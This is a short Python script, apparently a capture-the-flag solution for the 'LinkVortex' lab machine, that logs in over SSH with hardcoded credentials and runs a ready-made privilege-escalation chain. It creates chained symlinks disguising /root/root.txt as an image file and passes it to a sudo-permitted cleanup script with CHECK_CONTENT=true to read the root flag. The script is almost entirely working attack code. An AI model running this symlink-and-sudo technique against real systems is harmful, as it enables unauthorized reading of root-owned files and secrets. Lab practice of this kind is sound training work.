import paramiko



host = "linkvortex.htb"

port = 22

username = "bob"

password = "fibber-talented-worth"



commands = [

    "cat user.txt",

    "ln -s /root/root.txt flag.txt",

    "ln -s /home/bob/flag.txt cat.png ",

    "sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/cat.png"

]



client = paramiko.SSHClient()

client.set_missing_host_key_policy(paramiko.AutoAddPolicy())



try:

    client.connect(host, port, username, password)

    for cmd in commands:

        stdin, stdout, stderr = client.exec_command(cmd)

        print(f"Command: {cmd}\nOutput:\n{stdout.read().decode()}\n")

finally:

    client.close()

